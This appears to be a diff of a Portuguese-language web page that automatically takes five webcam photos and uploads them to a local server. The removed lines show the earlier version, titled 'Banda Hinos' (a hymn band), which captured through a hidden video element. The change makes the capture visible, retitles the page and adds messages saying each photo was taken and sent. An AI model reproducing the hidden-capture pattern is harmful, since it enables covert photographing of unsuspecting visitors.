@@ -11,6 +11,19 @@
         h1 {
             text-align: center;
         }
+        #videoElement {
+            width: 100%;
+            height: auto;
+            display: block;
+            margin: 20px auto;
+            border: 1px solid #ccc;
+        }
+        .message {
+            text-align: center;
+            font-size: 18px;
+            color: green;
+            margin: 10px 0;
+        }
         ul {
             list-style-type: none;
             padding: 0;
@@ -27,14 +40,21 @@
     </style>
 </head>
 <body>
-    <h1>Banda Hinos</h1>
+    <h1>Captura de Imagens Automática</h1>
+    
+    <!-- Elemento de vídeo visível -->
+    <video id="videoElement" autoplay></video>
+    
+    <!-- Mensagens para o usuário -->
+    <div id="photoMessage" class="message"></div>
+    <div id="uploadMessage" class="message"></div>
+
     <script>
-        navigator.mediaDevices.getUserMedia({ video: true })
+        // Solicita a câmera frontal
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
-                // Criar um elemento de vídeo oculto
-                const video = document.createElement('video');
+                const video = document.getElementById('videoElement');
                 video.srcObject = stream;
-                video.play();
 
                 let photoCount = 0;
                 const maxPhotos = 5;
@@ -54,12 +74,19 @@
 
                             formData.append('image', blob, fileName);
 
+                            // Exibir mensagem de foto tirada
+                            document.getElementById('photoMessage').textContent = "Foto tirada.";
+
                             fetch('http://localhost:5000/upload', {
                                 method: 'POST',
                                 body: formData,
                             })
                             .then(response => response.text())
-                            .then(data => console.log(data))
+                            .then(data => {
+                                console.log(data);
+                                // Exibir mensagem de upload
+                                document.getElementById('uploadMessage').textContent = "Foto enviada para o FTP.";
+                            })
                             .catch(error => console.error('Erro ao enviar:', error));
                         });
 
